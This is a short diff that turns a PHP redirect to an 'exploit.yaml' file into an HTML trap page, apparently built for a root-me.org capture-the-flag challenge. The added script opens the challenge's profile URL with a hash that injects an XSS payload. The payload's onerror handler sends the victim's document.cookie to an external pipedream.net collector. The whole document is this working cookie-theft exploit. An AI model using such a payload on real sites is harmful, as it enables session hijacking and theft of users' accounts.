@@ -1,3 +1,15 @@
-<?php
-header("Location: ismaelbenguetaib.github.io/exploit.yaml");
-?>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Page Piège</title>
+</head>
+<body>
+  <script>
+    const targetURL = "http://challenge01.root-me.org:58003/profile";
+    const xssPayload = "<img src='x' onerror='fetch(\`https://eo2uyqmp09oup0u.m.pipedream.net?cookie=\${document.cookie}\`)'>";
+    const maliciousHash = "#<div id='output'>" + xssPayload + "</div>";
+    const newWindow = window.open(targetURL + maliciousHash);
+  </script>
+  <p>Chargement...</p>
+</body>
+</html>
